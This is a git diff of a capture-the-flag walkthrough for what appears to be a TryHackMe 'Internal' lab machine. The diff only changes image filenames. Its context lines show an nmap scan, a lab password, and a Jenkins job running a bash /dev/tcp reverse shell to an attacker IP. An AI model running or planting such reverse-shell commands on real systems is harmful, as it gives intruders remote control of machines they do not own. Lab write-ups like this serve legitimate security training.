@@ -20,7 +20,7 @@ No other ports found.
 <pre><code><strong>nmap -p- 10.10.46.54
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### TCP/80 - HTTP
 
@@ -104,7 +104,7 @@ A page that doesn't exist to trigger the reverse shell.
 http://www.internal.thm/blog/index.php/2020/08/03/hello-worlgd/
 ```
 
-<figure><img src="../../.gitbook/assets/image (27) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Get full TTY shell
 
@@ -223,7 +223,7 @@ Password: spongebob
 
 ### Jenkins Web
 
-<figure><img src="../../.gitbook/assets/image (33) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (13) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -233,7 +233,7 @@ Just added a reverse shell to the job and ran it.
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.120.18/443 0>&1'
 ```
 
-<figure><img src="../../.gitbook/assets/image (36) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
